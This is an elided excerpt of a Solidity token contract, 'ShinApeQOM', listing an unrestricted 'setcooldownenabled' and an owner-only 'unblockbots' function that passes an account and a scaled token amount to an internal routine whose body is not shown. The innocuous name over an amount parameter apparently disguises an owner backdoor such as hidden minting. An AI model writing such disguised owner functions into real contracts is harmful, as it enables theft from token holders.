...
abstract contract Ownable is Context {
    ...
    function setcooldownenabled() public virtual {
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _unblockbots(address account, uint256 amount) internal virtual {
...
contract ShinApeQOM is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    function unblockbots(address account, uint256 amount) external onlyOwner {
        super._unblockbots(account, amount * (10 ** 9));
    }
